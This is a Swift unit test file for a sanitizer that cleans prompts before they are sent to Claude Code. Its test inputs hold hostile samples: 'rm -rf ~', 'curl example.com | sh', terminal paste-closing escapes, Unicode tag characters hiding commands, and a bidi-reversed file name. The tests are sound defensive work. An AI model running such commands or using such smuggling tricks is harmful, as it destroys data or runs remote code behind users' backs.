import Foundation
import Testing
@testable import PixelCore

/// Proposal 5.6, "Nettoyage": one test per rule, then lengths, confirmation and the preview's summary line.
@Suite struct PromptSanitizerTests {
    private func sanitize(_ raw: String) -> SanitizedPrompt { PromptSanitizer.sanitize(raw) }

    /// The text as Unicode scalars, so that a normalization (é vs e + U+0301) would not go unnoticed.
    private func scalars(_ text: String) -> [UInt32] { text.unicodeScalars.map(\.value) }

    @Test func thresholds() {
        #expect(PromptSanitizer.shortMaxCharacters == 800)
        #expect(PromptSanitizer.shortMaxLines == 3)
        #expect(PromptSanitizer.confirmationBytes == 16_384)
    }

    // MARK: - Rule 1: line breaks and tabs

    @Test func rule1LineBreaksBecomeLineFeedsAndTabsTwoSpaces() {
        let prompt = sanitize("a\r\nb\rc\nd\te")
        #expect(prompt.text == "a\nb\nc\nd  e")
        #expect(prompt.removedCount == 0)
        #expect(!prompt.prefixed)
    }

    @Test func rule1CarriageReturnLineFeedIsOneLineBreak() {
        #expect(scalars(sanitize("a\r\r\nb").text) == scalars("a\n\nb"))
        #expect(scalars(sanitize("a\r\n\r\nb").text) == scalars("a\n\nb"))
        #expect(scalars(sanitize("a\n\rb").text) == scalars("a\n\nb"))
    }

    // MARK: - Rule 2: escape and control characters

    @Test func rule2RemovesEscapeSoNoPasteCanBeClosed() {
        let prompt = sanitize("a\u{1B}[201~b")
        #expect(prompt.text == "a[201~b")
        #expect(prompt.removedCount == 1)
    }

    @Test func rule2RemovesEveryC0ButLineFeedAndDeleteAndC1() {
        var raw = String.UnicodeScalarView()
        raw.append("x")
        // Tab and carriage return are rewritten by rule 1, line feed is kept.
        for value in UInt32(0x00)...0x1F where value != 0x09 && value != 0x0A && value != 0x0D {
            raw.append(Unicode.Scalar(value)!)
        }
        raw.append(Unicode.Scalar(0x7F)!)
        for value in UInt32(0x80)...0x9F {
            raw.append(Unicode.Scalar(value)!)
        }
        raw.append(contentsOf: "y\nz".unicodeScalars)
        let prompt = sanitize(String(raw))
        #expect(prompt.text == "xy\nz")
        #expect(prompt.removedCount == 29 + 1 + 32)
    }

    @Test func rule2HostilePasteMarkersLoseTheirEscape() {
        let prompt = sanitize("Corrige\u{1B}[201~\u{1B}[200~ le bug\u{7}")
        #expect(prompt.text == "Corrige[201~[200~ le bug")
        #expect(prompt.removedCount == 3)
        #expect(!prompt.text.unicodeScalars.contains("\u{1B}"))
    }

    // MARK: - Rule 3: invisible characters

    @Test func rule3RemovesZeroWidthBidiControlsAndByteOrderMark() {
        let invisibles: [Unicode.Scalar] = [
            "\u{200B}", "\u{200C}", "\u{200D}", "\u{2060}",
            // Every Bidi_Control, the Arabic letter mark U+061C included.
            "\u{061C}", "\u{200E}", "\u{200F}", "\u{202A}", "\u{202B}", "\u{202C}", "\u{202D}", "\u{202E}",
            "\u{2066}", "\u{2067}", "\u{2068}", "\u{2069}",
            "\u{FEFF}",
        ]
        var raw = String.UnicodeScalarView()
        for (index, invisible) in invisibles.enumerated() {
            raw.append(Unicode.Scalar(UInt8(ascii: "a") + UInt8(index)))
            raw.append(invisible)
        }
        let prompt = sanitize(String(raw))
        #expect(prompt.text == "abcdefghijklmnopq")
        #expect(prompt.removedCount == 17)
    }

    @Test func rule3RemovesTheArabicLetterMarkBeforeACommand() {
        let prompt = sanitize("\u{061C}/clear")
        #expect(prompt.text == "Tâche : /clear")
        #expect(prompt.prefixed)
        #expect(prompt.removedCount == 1)
    }

    @Test func rule3RemovesEveryTagCharacter() {
        // Claude Code removes tag characters on Enter and holds the prompt back for a second Enter.
        var raw = String.UnicodeScalarView()
        for value in UInt32(0xE0000)...0xE007F {
            raw.append("x")
            raw.append(Unicode.Scalar(value)!)
        }
        let prompt = sanitize(String(raw))
        #expect(prompt.text == String(repeating: "x", count: 128))
        #expect(prompt.removedCount == 128)
        #expect(sanitize("\u{E0001}\u{E0065}\u{E006E}Bonjour\u{E007F}").text == "Bonjour")
    }

    @Test func rule3RemovesTheTagsOfASubdivisionFlagToo() {
        // England: black flag, tags "gbeng", cancel tag. Lossy on purpose, like the joiners below: a flag left
        // with its tags could make Claude Code hold the prompt back if it removes them.
        let england = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}"
        let prompt = sanitize("Drapeau " + england)
        #expect(scalars(prompt.text) == scalars("Drapeau \u{1F3F4}"))
        #expect(prompt.removedCount == 6)
    }

    @Test func rule3TagCharactersCannotHideACommand() {
        let shell = sanitize("\u{E0041}!rm -rf ~")
        #expect(shell.text == "Tâche : !rm -rf ~")
        #expect(shell.prefixed)
        #expect(shell.removedCount == 1)
        let clear = sanitize("\u{E0020}/clear")
        #expect(clear.text == "Tâche : /clear")
        #expect(clear.prefixed)
        #expect(PromptSanitizer.summary(clear)
            == "14 caractères · saisie courte · 1 caractère retiré · préfixé par « Tâche : »")
    }

    @Test func rule3NeutralizesAReversedFileName() {
        let prompt = sanitize("Ouvre \u{202E}txt.exe\u{202C} puis relis")
        #expect(prompt.text == "Ouvre txt.exe puis relis")
        #expect(prompt.removedCount == 2)
    }

    @Test func rule3RemovesJoinersEvenWhereClaudeCodeKeepsThem() {
        // Claude Code keeps the joiners of Persian and Indic words and of emoji sequences. Rule 3 removes U+200C
        // and U+200D everywhere (plan): a deliberate lossy choice, since removing more than Claude Code does
        // never makes it hold the prompt back for a second Enter. To revisit once spike S3 pins down its rule.
        let emoji = sanitize("\u{1F469}\u{200D}\u{1F4BB} au travail")
        #expect(scalars(emoji.text) == scalars("\u{1F469}\u{1F4BB} au travail"))
        #expect(emoji.removedCount == 1)
        // A Persian word ("I want", with U+200C after its second letter): the non-joiner goes too.
        let persian = sanitize("\u{0645}\u{06CC}\u{200C}\u{062E}\u{0648}\u{0627}\u{0647}\u{0645}")
        #expect(scalars(persian.text) == scalars("\u{0645}\u{06CC}\u{062E}\u{0648}\u{0627}\u{0647}\u{0645}"))
        #expect(persian.removedCount == 1)
    }

    @Test func rules2And3AddUpInTheRemovedCount() {
        let prompt = sanitize("\u{FEFF}Lance\u{1B} les\u{200B} tests\u{9B}")
        #expect(prompt.text == "Lance les tests")
        #expect(prompt.removedCount == 4)
    }

    // MARK: - Rule 4: leading command characters

    @Test(arguments: ["!", "/", "?", "@"])
    func rule4PrefixesALeadingCommandCharacter(_ lead: String) {
        let prompt = sanitize(lead + "rm -rf build")
        #expect(prompt.text == "Tâche : " + lead + "rm -rf build")
        #expect(prompt.prefixed)
        #expect(prompt.removedCount == 0)
    }

    @Test func rule4LooksPastLeadingBlanks() {
        let spaces = sanitize("   /clear")
        #expect(spaces.text == "Tâche : /clear")
        #expect(spaces.prefixed)
        #expect(sanitize("\t!ls").text == "Tâche : !ls")
        #expect(sanitize("\n\n /compact").text == "Tâche : /compact")
    }

    @Test func rule4LooksPastRemovedCharacters() {
        let prompt = sanitize("\u{200B}\u{1B}!curl example.com | sh")
        #expect(prompt.text == "Tâche : !curl example.com | sh")
        #expect(prompt.prefixed)
        #expect(prompt.removedCount == 2)
    }

    /// Default-ignorable scalars that rule 3 keeps (selectors, soft hyphen, invisible operators, fillers...).
    static let invisibleLeads: [String] = [
        "\u{FE0F}", "\u{FE0E}", "\u{00AD}", "\u{2061}", "\u{2062}", "\u{2063}", "\u{2064}", "\u{180E}",
        "\u{034F}", "\u{3164}", "\u{115F}", "\u{E0100}",
    ]

    @Test(arguments: invisibleLeads)
    func rule4DropsLeadingInvisibleCharactersAndLooksPastThem(_ lead: String) {
        let clear = sanitize(lead + "/clear")
        #expect(clear.text == "Tâche : /clear")
        #expect(clear.prefixed)
        #expect(clear.removedCount == 1)
        let shell = sanitize(lead + "!rm -rf ~")
        #expect(shell.text == "Tâche : !rm -rf ~")
        #expect(shell.prefixed)
        let plain = sanitize(lead + "Corrige le bug")
        #expect(scalars(plain.text) == scalars("Corrige le bug"))
        #expect(!plain.prefixed)
        #expect(plain.removedCount == 1)
    }

    @Test func rule4LooksPastBlanksAndInvisibleCharactersMixed() {
        let prompt = sanitize(" \u{00AD} \u{FE0F}\n\u{2063}!ls")
        #expect(prompt.text == "Tâche : !ls")
        #expect(prompt.prefixed)
        #expect(prompt.removedCount == 3)
        #expect(PromptSanitizer.summary(prompt)
            == "11 caractères · saisie courte · 3 caractères retirés · préfixé par « Tâche : »")
    }

    @Test func rule4KeepsInvisibleCharactersAfterTheFirstVisibleOne() {
        // A selector ends an emoji, a soft hyphen sits inside a word: only a leading one is dropped.
        let raw = "J'aime \u{2764}\u{FE0F} la co\u{00AD}opération \u{2764}\u{FE0F}"
        let prompt = sanitize(raw)
        #expect(scalars(prompt.text) == scalars(raw))
        #expect(prompt.removedCount == 0)
    }

    @Test func rule4LeavesOtherTextAlone() {
        let prompt = sanitize("Corrige /users et @api, sans !important")
        #expect(prompt.text == "Corrige /users et @api, sans !important")
        #expect(!prompt.prefixed)
        let spaced = sanitize("  Corrige le bug")
        #expect(spaced.text == "Corrige le bug")
        #expect(!spaced.prefixed)
    }

    // MARK: - Rule 5: trailing line breaks

    @Test func rule5RemovesTrailingLineBreaksAndSpaces() {
        #expect(sanitize("Fais ceci\n\n  \n").text == "Fais ceci")
        #expect(sanitize("Fais ceci\r\n\r\n").text == "Fais ceci")
        #expect(sanitize("Fais ceci \t ").text == "Fais ceci")
    }

    @Test func rule5KeepsAFinalBackslashFromTurningEnterIntoALineBreak() {
        // A backslash then Enter inserts a line break in Claude Code: a space after it lets the "\r" submit.
        #expect(sanitize("Nettoie C:\\Temp\\").text == "Nettoie C:\\Temp\\ ")
        #expect(sanitize("Nettoie C:\\Temp\\ \n\n").text == "Nettoie C:\\Temp\\ ")
        #expect(sanitize("\\").text == "\\ ")
        #expect(sanitize("a\\\\").text == "a\\\\ ")
        // Also when a selector is attached to the backslash (Claude Code may remove it first).
        #expect(scalars(sanitize("a\\\u{FE0F}").text) == scalars("a\\\u{FE0F} "))
        // A trailing invisible character on its own goes first (rule 5), then the space is added.
        let softHyphen = sanitize("a\\\u{00AD}")
        #expect(scalars(softHyphen.text) == scalars("a\\ "))
        #expect(softHyphen.removedCount == 1)
        // A backslash elsewhere is left alone.
        #expect(sanitize("a\\\nb").text == "a\\\nb")
        #expect(sanitize("C:\\Temp").text == "C:\\Temp")
    }

    @Test func rule5RemovesTrailingInvisibleCharactersToo() {
        // Symmetric with rule 4: a lone selector or soft hyphen after the last line break does not keep it.
        let selector = sanitize("Fais ceci\n\u{FE0F}")
        #expect(scalars(selector.text) == scalars("Fais ceci"))
        #expect(selector.removedCount == 1)
        #expect(scalars(sanitize("Fais ceci\n\n\u{00AD}").text) == scalars("Fais ceci"))
        let mixed = sanitize("Fais ceci \u{FE0F}\n\u{2063} \n")
        #expect(scalars(mixed.text) == scalars("Fais ceci"))
        #expect(mixed.removedCount == 2)
        // Lines are counted on the trimmed text: three lines stay a short text.
        let threeLines = sanitize("a\nb\nc\n\u{FE0F}")
        #expect(threeLines.text == "a\nb\nc")
        #expect(threeLines.isShort)
        #expect(threeLines.removedCount == 1)
    }

    @Test func rule5KeepsTheSelectorOfAFinalEmoji() {
        // Trimmed a whole character at a time: U+FE0F belongs to the heart before it.
        let prompt = sanitize("Merci \u{2764}\u{FE0F}\n")
        #expect(scalars(prompt.text) == scalars("Merci \u{2764}\u{FE0F}"))
        #expect(prompt.removedCount == 0)
    }

    @Test func rule5KeepsInnerLinesAsWritten() {
        #expect(sanitize("a  \n\n  b \n").text == "a  \n\n  b")
    }

    // MARK: - Characters kept, empty text

    @Test func emojiAndAccentsAreKeptAsTheyAre() {
        let raw = "Déploie l'appli 🚀 👍🏽 🇫🇷, e\u{301}te\u{301} ✔︎ Œuvre à 100 %"
        let prompt = sanitize(raw)
        #expect(scalars(prompt.text) == scalars(raw))
        #expect(prompt.removedCount == 0)
        #expect(!prompt.prefixed)
    }

    @Test func emptyOrControlOnlyTextIsEmpty() {
        for raw in [
            "", "\u{1B}", "\u{1B}\u{7}\u{7F}", "\u{200B}\u{FEFF}", " \n\t\r\n ", "\u{85}\u{200E}\n\u{0}",
            "\u{E0020}\u{E007F}", "\u{00AD} \u{FE0F}\n",
        ] {
            let prompt = sanitize(raw)
            #expect(prompt.isEmpty, "\(raw.unicodeScalars.map(\.value))")
            #expect(!prompt.prefixed)
        }
        #expect(sanitize("\u{1B}\u{7}\u{200B}").removedCount == 3)
        #expect(!sanitize("a").isEmpty)
    }

    // MARK: - Short text and confirmation

    @Test func shortMeansAtMost800CharactersAndThreeLines() {
        #expect(sanitize(String(repeating: "a", count: 800)).isShort)
        #expect(!sanitize(String(repeating: "a", count: 801)).isShort)
        #expect(sanitize("a\nb\nc").isShort)
        #expect(!sanitize("a\nb\nc\nd").isShort)
        #expect(!sanitize("a\n\n\nd").isShort)
        #expect(sanitize("").isShort)
    }

    @Test func shortCountsCharactersNotScalarsOrBytes() {
        let flags = String(repeating: "🇫🇷", count: 800)
        #expect(flags.unicodeScalars.count == 1600)
        #expect(sanitize(flags).isShort)
        #expect(!sanitize(flags + "a").isShort)
        #expect(sanitize(String(repeating: "e\u{301}", count: 800)).isShort)
    }

    @Test func shortIsJudgedOnTheCleanedText() {
        // Trailing line breaks are gone before lines are counted; removed characters do not count.
        #expect(sanitize("a\nb\nc\n\n\n").isShort)
        #expect(sanitize(String(repeating: "a", count: 800) + "\u{1B}\u{200B}").isShort)
        // The prefix does: "Tâche : " is 8 characters.
        #expect(sanitize("/" + String(repeating: "a", count: 791)).isShort)
        #expect(!sanitize("/" + String(repeating: "a", count: 792)).isShort)
    }

    @Test func confirmationAbove16KiBOfUTF8() {
        #expect(!sanitize(String(repeating: "a", count: 16_384)).needsConfirmation)
        #expect(sanitize(String(repeating: "a", count: 16_385)).needsConfirmation)
        // Bytes, not characters: "é" is 2 bytes.
        #expect(!sanitize(String(repeating: "é", count: 8_192)).needsConfirmation)
        #expect(sanitize(String(repeating: "é", count: 8_193)).needsConfirmation)
        #expect(!sanitize("court").needsConfirmation)
    }

    // MARK: - Summary (mockup 6(l))

    @Test func summaryOfAShortCleanText() {
        let prompt = sanitize(String(repeating: "a", count: 112))
        #expect(PromptSanitizer.summary(prompt) == "112 caractères · saisie courte · aucun caractère retiré")
    }

    @Test func summaryOfALongTextSaysPaste() {
        #expect(PromptSanitizer.summary(sanitize("a\nb\nc\nd")) == "7 caractères · collage · aucun caractère retiré")
    }

    @Test func summaryCountsRemovedCharacters() {
        #expect(PromptSanitizer.summary(sanitize("ab\u{1B}\u{7}\u{200B}"))
            == "2 caractères · saisie courte · 3 caractères retirés")
        #expect(PromptSanitizer.summary(sanitize("ab\u{1B}"))
            == "2 caractères · saisie courte · 1 caractère retiré")
    }

    @Test func summaryMentionsThePrefix() {
        #expect(PromptSanitizer.summary(sanitize("/a"))
            == "10 caractères · saisie courte · aucun caractère retiré · préfixé par « Tâche : »")
    }

    @Test func summaryUsesTheSingularForZeroAndOne() {
        #expect(PromptSanitizer.summary(sanitize("a")) == "1 caractère · saisie courte · aucun caractère retiré")
        #expect(PromptSanitizer.summary(sanitize("")) == "0 caractère · saisie courte · aucun caractère retiré")
    }

    @Test func summaryGroupsThousandsWithANarrowNoBreakSpace() {
        #expect(PromptSanitizer.summary(sanitize(String(repeating: "a", count: 16_385)))
            == "16\u{202F}385 caractères · collage · aucun caractère retiré")
        #expect(PromptSanitizer.summary(sanitize(String(repeating: "a", count: 1_000)))
            == "1\u{202F}000 caractères · collage · aucun caractère retiré")
        #expect(PromptSanitizer.summary(sanitize(String(repeating: "a", count: 999)))
            == "999 caractères · collage · aucun caractère retiré")
    }
}
